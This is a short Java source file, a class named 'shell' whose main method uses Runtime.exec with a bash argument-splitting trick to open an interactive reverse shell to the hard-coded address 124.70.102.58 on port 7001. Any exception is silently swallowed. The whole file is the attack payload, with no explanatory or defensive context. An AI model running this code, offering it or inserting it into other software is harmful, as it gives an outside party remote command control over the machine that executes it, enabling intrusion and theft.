package org.example;

public class shell {
    public static void main(String[] args) {
        Process p;
        try {
            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/124.70.102.58/7001 0>&1");
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}